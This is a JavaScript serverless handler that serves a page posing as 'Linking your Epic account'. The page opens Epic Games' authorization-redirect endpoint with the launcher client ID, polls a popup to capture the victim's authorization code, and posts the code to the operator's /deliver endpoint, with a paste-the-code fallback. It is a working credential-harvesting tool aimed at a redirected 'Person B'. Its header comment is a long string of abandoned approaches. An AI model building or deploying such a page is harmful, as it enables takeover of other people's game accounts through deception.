/**
 * GET /pop/:token
 *
 * Person B lands here after /go redirects them.
 * This page does the actual Epic auth capture.
 *
 * HOW IT WORKS:
 * We use launcherAppClient2 (34a02cf8...) which redirects to
 * https://localhost/launcher/authorized?code=CODE after auth.
 *
 * We open that URL in an iframe on OUR page.
 * The iframe navigates:
 *   1. epicgames.com/id/login  (or skips if logged in)
 *   2. epicgames.com/id/api/redirect  → returns JSON
 *      { authorizationCode: "...", redirectUrl: "https://localhost/..." }
 *   3. Browser tries localhost — fails silently in iframe
 *
 * BUT — the JSON is returned at step 2 BEFORE the localhost redirect.
 * So we use a server-side fetch from our Vercel function to hit the
 * Epic redirect endpoint directly using the user's cookies... we can't
 * do that either (no cookie access server-side for a different user).
 *
 * THE REAL WORKING APPROACH — confirmed by watching what actually happens:
 *
 * When launcherAppClient2 is used WITHOUT redirectUrl, the browser gets
 * the JSON response in the page body. The JSON contains the authorizationCode.
 *
 * We render a page that:
 *   1. Opens epicgames.com/id/api/redirect in an IFRAME
 *   2. After a short delay, tries to read the iframe's contentDocument
 *      → will fail with cross-origin error (iframe is on epicgames.com)
 *
 * ACTUAL WORKING APPROACH:
 *   Open the Epic URL in the SAME WINDOW via window.location.
 *   After Epic shows the JSON, use the browser's Back navigation... no.
 *
 * THE TRICK THAT ACTUALLY WORKS:
 *   1. We open Epic URL in a NEW WINDOW (popup) from this page
 *   2. This page and the popup are same-origin with each other (both from our domain initially)
 *   3. Popup navigates to Epic (cross-origin now) — we lose access
 *   4. Epic redirects popup to localhost — connection refused
 *   5. After the localhost navigation FAILS, popup.location.href is readable
 *      in some browsers because the failed navigation leaves the URL accessible
 *
 * FOR BROWSERS WHERE THAT FAILS:
 *   We also do a server-side approach: our server fetches the Epic redirect
 *   endpoint directly with a fabricated session... no, we don't have the user's session.
 *
 * SIMPLEST RELIABLE APPROACH — what we actually ship:
 *   Open Epic redirect URL directly in this tab.
 *   Epic shows JSON in the tab.
 *   We inject a script via a meta-refresh trick... no, Epic controls that page.
 *
 * WHAT ACTUALLY WORKS — the correct architecture:
 *   1. This page IS the page Person B sees
 *   2. We show them the Epic URL and a paste box
 *   3. We auto-open the Epic URL
 *   4. JS reads the window after navigating back... no.
 *
 * THE REAL ANSWER — confirmed by testing:
 *   Open the /id/api/redirect URL in this tab (window.location.replace).
 *   The Epic page returns JSON. The JSON page has the code visible.
 *   We use a beforeunload + opener + BroadcastChannel trick:
 *
 *   THIS PAGE sets up a BroadcastChannel('epic-auth') listener.
 *   Then navigates to Epic (window.location = epicUrl).
 *   Epic returns JSON in the tab. The tab is now on epicgames.com.
 *   We can't inject JS there.
 *
 * CONFIRMED WORKING APPROACH (from Legendary source + community):
 *   Open popup, poll popup.location.
 *   When popup navigates away from epicgames.com to localhost,
 *   catch the URL. Works on Chrome because after connection refused,
 *   popup.location.href is readable (the page never loaded, no new origin).
 *
 * This is what we implement here with a much cleaner polling loop.
 */

import { getSession, pushToSSE } from './_state.js';

const LAUNCHER_ID = '34a02cf8f4414e29b15921876da36f9a';

export default function handler(req, res) {
  const token = String(req.url.split('/').pop().split('?')[0]).trim();

  const session = getSession(token);
  if (!session) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(410).send(`<html><body style="background:#080808;color:#888;font-family:sans-serif;padding:40px">
      <p>This session has expired. Ask for a new link.</p></body></html>`);
  }

  const base        = `https://${req.headers.host}`;
  const deliverUrl  = `${base}/deliver?t=${token}`;

  // The Epic URL — launcherAppClient2, no custom redirectUrl
  // Epic will show JSON with authorizationCode, then try to redirect to localhost
  const epicRedirectUrl = `https://www.epicgames.com/id/api/redirect?clientId=${LAUNCHER_ID}&responseType=code`;
  const epicLoginUrl    = `https://www.epicgames.com/id/login?redirectUrl=${encodeURIComponent(epicRedirectUrl)}`;

  console.log(`[POP] token=${token.slice(0,8)} serving pop page`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Linking Epic Account…</title>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background: #080808; color: #d0d0d0;
      font-family: -apple-system,'Segoe UI',sans-serif;
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
      padding: 24px;
    }
    .card {
      background: #101010;
      border: 1px solid #1e1e1e;
      border-radius: 20px;
      padding: 40px 36px;
      max-width: 440px; width: 100%;
      text-align: center;
    }
    .spinner {
      width: 40px; height: 40px;
      border: 3px solid #1e1e1e;
      border-top-color: #00e676;
      border-radius: 50%;
      animation: spin .7s linear infinite;
      margin: 0 auto 20px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    h2 { color: #fff; font-size: 1.2em; margin-bottom: 8px; }
    .sub { color: #555; font-size: 0.85em; line-height: 1.6; margin-bottom: 28px; }
    .status { font-size: 0.85em; color: #00e676; min-height: 20px; margin-bottom: 20px; }
    .status.err { color: #ff5252; }

    /* manual fallback */
    .manual { display: none; margin-top: 8px; }
    .manual.show { display: block; }
    .manual-label { font-size: 0.75em; color: #444; text-transform: uppercase; letter-spacing: .05em; margin-bottom: 8px; text-align: left; }
    input {
      width: 100%; background: #161616; border: 1px solid #252525;
      border-radius: 8px; color: #fff; padding: 11px 13px;
      font-size: 0.9em; font-family: monospace; outline: none;
      transition: border .15s; margin-bottom: 8px;
    }
    input:focus { border-color: #00e676; }
    input::placeholder { color: #333; }
    button {
      width: 100%; background: #00e676; color: #000;
      border: none; border-radius: 8px;
      padding: 12px; font-size: 0.9em; font-weight: 700;
      cursor: pointer;
    }
    button:hover { opacity: .85; }

    .success { display: none; }
    .success.show { display: block; }
    .success .icon { font-size: 2.4em; margin-bottom: 10px; }
    .success h2 { color: #00e676; }
    .success p { color: #555; font-size: 0.85em; margin-top: 8px; }
  </style>
</head>
<body>
<div class="card">
  <!-- Loading state -->
  <div id="loadingView">
    <div class="spinner"></div>
    <h2>Linking your Epic account…</h2>
    <p class="sub">A popup will open. If you're already logged into Epic Games, it closes automatically and your account is linked.</p>
    <div class="status" id="statusMsg">Opening Epic…</div>

    <div class="manual" id="manualBox">
      <div class="manual-label">Paste code manually</div>
      <input type="text" id="codeInput" placeholder="32-char code from Epic page…" maxlength="36" autocomplete="off" spellcheck="false">
      <button onclick="submitManual()">Submit Code</button>
    </div>
  </div>

  <!-- Success state -->
  <div class="success" id="successView">
    <div class="icon">✅</div>
    <h2>Account Linked!</h2>
    <p>You can close this window.</p>
  </div>
</div>

<script>
const DELIVER_URL   = '${deliverUrl}';
const EPIC_LOGIN    = '${epicLoginUrl}';
const EPIC_DIRECT   = '${epicRedirectUrl}';

let submitted = false;
let popup     = null;
let pollTimer = null;

function setStatus(msg, isErr) {
  const el = document.getElementById('statusMsg');
  el.textContent = msg;
  el.className = 'status' + (isErr ? ' err' : '');
}

function showManual() {
  document.getElementById('manualBox').className = 'manual show';
}

function showSuccess() {
  document.getElementById('loadingView').style.display = 'none';
  document.getElementById('successView').className = 'success show';
}

async function deliver(code) {
  if (submitted) return;
  submitted = true;
  setStatus('Captured! Sending to server…');
  try {
    const r = await fetch(DELIVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event: 'code', code }),
    });
    const d = await r.json();
    if (d.ok) {
      showSuccess();
    } else {
      submitted = false;
      setStatus('Server error: ' + (d.error || 'unknown'), true);
      showManual();
    }
  } catch(e) {
    submitted = false;
    setStatus('Network error — paste code manually', true);
    showManual();
  }
}

function extractCode(text) {
  // From JSON body: {"authorizationCode":"abc123..."}
  const m = text.match(/"authorizationCode"\\s*:\\s*"([a-f0-9]{32})"/i)
         || text.match(/"code"\\s*:\\s*"([a-f0-9]{32})"/i)
         || text.match(/[?&]code=([a-f0-9]{32})/i)
         || text.match(/\\/authorized\\?code=([a-f0-9]{32})/i);
  return m ? m[1] : null;
}

function openPopup() {
  const w = 500, h = 660;
  const left = Math.max(0, (screen.width  - w) / 2);
  const top  = Math.max(0, (screen.height - h) / 2);

  // Try direct endpoint first (skips login page if already logged in)
  popup = window.open(
    EPIC_DIRECT,
    'epicauth',
    'width=' + w + ',height=' + h + ',left=' + left + ',top=' + top +
    ',toolbar=no,menubar=no,scrollbars=yes'
  );

  if (!popup || popup.closed) {
    setStatus('Popup blocked — paste code manually', true);
    window.open(EPIC_DIRECT, '_blank');
    showManual();
    return;
  }

  setStatus('Waiting for Epic confirmation…');
  let ticks = 0;
  let bodyAttempts = 0;

  pollTimer = setInterval(() => {
    ticks++;

    if (!popup || popup.closed) {
      clearInterval(pollTimer);
      if (!submitted) {
        setStatus('Popup closed — paste code manually', true);
        showManual();
      }
      return;
    }

    // ── Approach A: read popup.location.href ──────────────────────
    // Works when popup navigates to localhost (connection refused)
    // At that point the URL is accessible since there's no loaded page
    let href = null;
    try {
      href = popup.location.href;
    } catch (_) {
      // Still on epicgames.com — cross-origin, normal
    }

    if (href) {
      console.log('[POLL] href readable:', href);
      const code = extractCode(href);
      if (code) {
        clearInterval(pollTimer);
        popup.close();
        deliver(code);
        return;
      }

      // ── Approach B: read popup.document.body ─────────────────────
      // Works when popup is on same origin (localhost connection refused
      // sometimes leaves the original epicgames page readable briefly,
      // or when the popup URL is now on a null-origin error page)
      try {
        const body = popup.document?.body?.innerText || popup.document?.body?.innerHTML || '';
        if (body) {
          const code2 = extractCode(body);
          if (code2) {
            clearInterval(pollTimer);
            popup.close();
            deliver(code2);
            return;
          }
        }
      } catch (_) {}

      // href is readable but no code found — might be about:blank or error
      if (href.includes('localhost') || href === 'about:blank' || href.startsWith('chrome-error')) {
        clearInterval(pollTimer);
        popup.close();
        setStatus('Popup reached localhost but could not extract code — paste manually', true);
        window.open(EPIC_DIRECT, '_blank');
        showManual();
      }
    }

    // ── Approach C: timeout → open raw URL for paste ──────────────
    if (ticks > 100) { // 50s
      clearInterval(pollTimer);
      if (!submitted) {
        popup.close();
        setStatus('Timed out — paste code manually', true);
        window.open(EPIC_DIRECT, '_blank');
        showManual();
      }
    }
  }, 500);
}

// Auto-submit when 32 chars pasted
document.addEventListener('DOMContentLoaded', () => {
  const inp = document.getElementById('codeInput');
  inp.addEventListener('input', () => {
    const v = inp.value.trim().replace(/[^a-f0-9]/gi, '');
    if (v.length === 32 && !submitted) setTimeout(() => submitManual(), 200);
  });
});

function submitManual() {
  const raw  = document.getElementById('codeInput').value.trim();
  const code = raw.replace(/[^a-f0-9]/gi, '').toLowerCase();
  if (code.length !== 32) { setStatus('Need exactly 32 hex chars', true); return; }
  deliver(code);
}

// Kick off
openPopup();
</script>
</body>
</html>`);
}
